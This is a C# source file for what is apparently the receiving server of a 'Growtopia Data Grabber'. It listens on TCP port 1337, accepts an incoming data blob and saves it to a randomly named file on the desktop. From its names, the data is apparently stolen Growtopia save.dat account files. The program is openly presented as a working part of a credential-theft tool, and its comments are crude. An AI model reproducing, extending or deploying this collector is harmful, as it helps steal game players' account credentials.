using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace SaveDAT_Grabber
{
    class Program
    {
   
        static void Main(string[] args)
        {

            Console.WriteLine("Growtopia Data Grabber (c) Liab [ALIX] Server");
            
            TcpListener listen = new TcpListener(1337);
            TcpClient client;
            int bufferSize = 1024;
            NetworkStream netStream;
            int bytesRead = 0;
            int allBytesRead = 0;

         
            listen.Start();

      
            client = listen.AcceptTcpClient();
            netStream = client.GetStream();

     
            byte[] length = new byte[4];
            bytesRead = netStream.Read(length, 0, 4);
            int dataLength = BitConverter.ToInt32(length, 0);

          
            int bytesLeft = dataLength;
            byte[] data = new byte[dataLength];

            while (bytesLeft > 0)
            {

                int nextPacketSize = (bytesLeft > bufferSize) ? bufferSize : bytesLeft;

                bytesRead = netStream.Read(data, allBytesRead, nextPacketSize);
                allBytesRead += bytesRead;
                bytesLeft -= bytesRead;

            }
            var Newname = new System.Random();
            File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\sex" + Newname.Next(1337,666673) + ".txt", data);

            Console.WriteLine("RECEIVE : Growtopia Data Grabbed " + Environment.OSVersion.ServicePack.ToString());
            // Clean up
            netStream.Close();
            client.Close();
            //Don't touch this stuff or u broke the leet server. if you want udp its faster go change it nub.
         
            //Handler for the 1337 leet socked fuck off!
    
            Console.BackgroundColor = ConsoleColor.Blue;

            
   
                    }
                




        }
    }

